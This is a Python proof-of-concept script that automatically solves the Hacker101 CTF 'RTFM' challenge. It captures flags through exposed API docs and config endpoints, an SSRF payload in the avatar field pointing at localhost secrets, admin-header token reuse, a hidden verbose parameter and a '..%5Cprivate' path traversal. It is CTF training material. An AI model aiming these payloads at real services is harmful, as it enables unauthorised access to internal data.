#!/usr/bin/env python3
"""
Hacker101 CTF — RTFM: Full PoC Script

Usage:
    python3 poc.py <TARGET_BASE_URL>

Example:
    python3 poc.py https://f7ab3d164fbb59399816060c8f292228.ctf.hacker101.com

Requirements:
    pip install requests    (or falls back to urllib)
    pip install rich        (optional — for colored output; falls back to plain text)
"""

import re
import sys
import random
import string

# ── Optional rich import for colored output ──────────────────────────
try:
    from rich.console import Console
    console = Console()  # type: ignore[reportPossiblyUnboundVariable]
    HAS_RICH = True
except ImportError:
    Console = None  # type: ignore[reportUnboundVariable]
    HAS_RICH = False

# ── HTTP backend ─────────────────────────────────────────────────────
_http_requests = None
try:
    import requests as _requests_lib
    _http_requests = _requests_lib
except ImportError:
    pass


def _request(method: str, url: str, data: str | None = None, headers: dict | None = None) -> str:
    """Unified HTTP request — returns response body as string."""
    hdrs = headers or {}
    if _http_requests is not None:
        m = method.upper()
        if m == "GET":
            r = _http_requests.get(url, headers=hdrs, timeout=30)
        elif m == "POST":
            r = _http_requests.post(url, data=data, headers=hdrs, timeout=30)
        elif m == "PUT":
            r = _http_requests.put(url, data=data, headers=hdrs, timeout=30)
        else:
            r = _http_requests.request(m, url, data=data, headers=hdrs, timeout=30)
        return r.text
    else:
        import urllib.request as _ur
        encoded = data.encode() if data else None
        req = _ur.Request(url, data=encoded, headers=hdrs, method=method.upper())
        with _ur.urlopen(req, timeout=30) as resp:
            return resp.read().decode()


# ══════════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════════

FLAG_RE = re.compile(r'\^FLAG\^([0-9a-f]{64})\$FLAG\$')


def extract_flag(text: str) -> str | None:
    """Extract the 64-char hex flag from text."""
    m = FLAG_RE.search(text)
    return m.group(1) if m else None



def http_get(url: str, headers: dict | None = None) -> str:
    return _request("GET", url, headers=headers)


def http_post(url: str, data: str | None = None, headers: dict | None = None) -> str:
    return _request("POST", url, data=data, headers=headers)


def http_put(url: str, data: str | None = None, headers: dict | None = None) -> str:
    return _request("PUT", url, data=data, headers=headers)


def rand_str(prefix: str = "poc") -> str:
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{prefix}_{suffix}"


# ══════════════════════════════════════════════════════════════════════
#  Exploit
# ══════════════════════════════════════════════════════════════════════

class RTFMExploit:
    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.flags: dict[int, tuple[str, str]] = {}  # num -> (hex, description)
        self.token: str | None = None

    def _found(self, num: int, hex_flag: str, desc: str):
        self.flags[num] = (hex_flag, desc)
        msg = f"[+] FLAG{num} FOUND: {hex_flag}"
        if HAS_RICH:
            console.print(f"[bold green]{msg}[/]")
            console.print(f"    [yellow]{desc}[/]")
        else:
            print(f"\033[0;32m{msg}\033[0m")
            print(f"\033[1;33m    {desc}\033[0m")

    def _log(self, msg: str):
        if HAS_RICH:
            console.print(f"[cyan][*][/] {msg}")
        else:
            print(f"\033[0;36m[*]\033[0m {msg}")

    def _warn(self, msg: str):
        if HAS_RICH:
            console.print(f"[red][!][/] {msg}")
        else:
            print(f"\033[0;31m[!]\033[0m {msg}")

    # ── Flag 0 ──────────────────────────────────────────────────────
    def flag0_swagger(self):
        self._log("Flag 0 — Fetching /api/v2/swagger.json ...")
        resp = http_get(f"{self.target}/api/v2/swagger.json")
        h = extract_flag(resp)
        if h:
            self._found(0, h, "Exposed swagger documentation at /api/v2/swagger.json")
        else:
            self._log("No flag in swagger.json")

    # ── Flag 1 ──────────────────────────────────────────────────────
    def flag1_config(self):
        self._log("Flag 1 — Fetching /api/v1/config ...")
        resp = http_get(f"{self.target}/api/v1/config")
        h = extract_flag(resp)
        if h:
            self._found(1, h, "Server config endpoint /api/v1/config (no auth)")
        else:
            self._log("No flag in config")

    # ── Flag 2 + register user ──────────────────────────────────────
    def flag2_register(self) -> bool:
        username = rand_str("pocuser")
        password = rand_str("pocpass")
        self._log(f"Registering user: {username}:{password} ...")
        resp = http_post(f"{self.target}/api/v1/user", f"username={username}&password={password}")
        h = extract_flag(resp)
        if h:
            self._found(2, h, "POST /api/v1/user creates account with flag in response")
        else:
            self._log("No flag in registration response")

        # Login
        self._log(f"Logging in as {username} ...")
        login_resp = http_post(f"{self.target}/api/v1/user/login", f"username={username}&password={password}")
        try:
            import json
            self.token = json.loads(login_resp).get("token", "")
        except Exception:
            self.token = ""

        if not self.token:
            self._warn("Failed to obtain token — some flags will be skipped")
            return False

        self._log(f"Token obtained: {self.token}")
        return True

    # ── Flag 3 ──────────────────────────────────────────────────────
    def flag3_avatar_ssrf(self):
        if not self.token:
            return
        self._log("Flag 3 — PUT avatar SSRF to /api/v1/secrets ...")
        resp = http_put(
            f"{self.target}/api/v1/user",
            data="avatar=http://localhost/api/v1/secrets",
            headers={"X-Token": self.token},
        )
        h = extract_flag(resp)
        if h:
            self._found(3, h, "SSRF via avatar field → http://localhost/api/v1/secrets")
        else:
            self._log("No flag in avatar SSRF response")

    # ── Flag 4 ──────────────────────────────────────────────────────
    def flag4_verbose(self):
        self._log("Flag 4 — Trying verbose parameter on /api/v1/status ...")
        resp = http_get(f"{self.target}/api/v1/status?verbose=1")
        h = extract_flag(resp)
        if h:
            self._found(4, h, "Hidden verbose parameter on /api/v1/status")
        else:
            self._log("No flag via verbose parameter")

    # ── Flag 5 ──────────────────────────────────────────────────────
    def flag5_admin_userlist(self):
        if not self.token:
            return
        self._log("Flag 5 — Accessing /api/v2/admin/user-list with X-Session ...")
        resp = http_get(f"{self.target}/api/v2/admin/user-list", headers={"X-Session": self.token})
        h = extract_flag(resp)
        if h:
            self._found(5, h, "v2 admin user-list with X-Session = v1 token")
        else:
            self._log("No flag in admin user-list")

    # ── Flag 6 ──────────────────────────────────────────────────────
    def flag6_posts(self):
        if not self.token:
            return
        self._log("Flag 6 — Accessing /api/v1/user/posts/1 ...")
        resp = http_get(f"{self.target}/api/v1/user/posts/1", headers={"X-Token": self.token})
        h = extract_flag(resp)
        if h:
            self._found(6, h, "v1 user/posts documented in v2 swagger")
        else:
            self._log("No flag in posts")

    # ── Flag 7 ──────────────────────────────────────────────────────
    def flag7_path_traversal(self):
        self._log("Flag 7 — Path traversal in /api/v1/post-analytics/..%5Cprivate ...")
        resp = http_get(f"{self.target}/api/v1/post-analytics/..%5Cprivate")
        h = extract_flag(resp)
        if h:
            self._found(7, h, "Path traversal ..%5Cprivate in analytics endpoint")
        else:
            self._log("No flag via path traversal")

    # ── Run all ─────────────────────────────────────────────────────
    def run(self):
        header = f"  Hacker101 CTF — RTFM PoC  |  Target: {self.target}"
        if HAS_RICH:
            console.print(f"[bold green]{'='*60}[/]")
            console.print(f"[bold green]{header}[/]")
            console.print(f"[bold green]{'='*60}[/]\n")
        else:
            print(f"\033[0;32m{'='*60}\033[0m")
            print(f"\033[0;32m{header}\033[0m")
            print(f"\033[0;32m{'='*60}\033[0m\n")

        # Flags 0 and 1 don't need auth
        self.flag0_swagger()
        self.flag1_config()

        # Flags 2-7 depend on user registration + login
        authed = self.flag2_register()
        if authed:
            self.flag3_avatar_ssrf()
            self.flag5_admin_userlist()
            self.flag6_posts()

        # Flags 4 and 7 don't need auth
        self.flag4_verbose()
        self.flag7_path_traversal()

        # ── Summary ─────────────────────────────────────────────────
        print()
        if HAS_RICH:
            console.print(f"[bold green]{'='*60}[/]")
            console.print(f"[bold green]  Results: {len(self.flags)}/8 flags found[/]")
            console.print(f"[bold green]{'='*60}[/]")
            for num, (hex_f, desc) in sorted(self.flags.items()):
                console.print(f"  FLAG{num}: [red]{hex_f}[/]  →  [yellow]{desc}[/]")
        else:
            print(f"\033[0;32m{'='*60}\033[0m")
            print(f"\033[0;32m  Results: {len(self.flags)}/8 flags found\033[0m")
            print(f"\033[0;32m{'='*60}\033[0m")
            for num, (hex_f, desc) in sorted(self.flags.items()):
                print(f"  FLAG{num}: \033[0;31m{hex_f}\033[0m  →  \033[1;33m{desc}\033[0m")

        if len(self.flags) == 8:
            print()
            msg = "  All flags captured! 🎉"
            if HAS_RICH:
                console.print(f"[bold green]{msg}[/]")
            else:
                print(f"\033[0;32m{msg}\033[0m")


# ══════════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_BASE_URL>")
        print(f"Example: python3 {sys.argv[0]} https://XXXX.ctf.hacker101.com")
        sys.exit(1)

    RTFMExploit(sys.argv[1]).run()
